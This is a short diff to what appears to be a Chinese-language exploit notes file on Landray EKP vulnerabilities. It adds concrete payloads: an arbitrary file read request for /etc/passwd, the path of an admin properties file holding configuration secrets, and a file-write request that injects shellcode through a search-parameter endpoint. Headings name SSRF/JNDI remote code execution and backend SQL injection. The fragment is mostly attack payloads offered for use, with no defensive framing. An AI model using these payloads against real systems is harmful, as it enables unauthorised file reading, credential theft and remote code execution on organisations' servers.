@@ -17,9 +17,15 @@ var={"body":{"file":"file:///etc/passwd"}}
 
 # 0x02-SSRF+JNDI远程代码执行
 基于上面的任意文件读取
+```
+/WEB-INF/KmssConfig/admin.properties
+```
 
 # 0x03-任意文件写入漏洞
 基于上面的任意文件读取
+```
+var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=[shellcode]
+```
 
 # 0x04-EKP后台SQL注入
 后台地址/admin.do
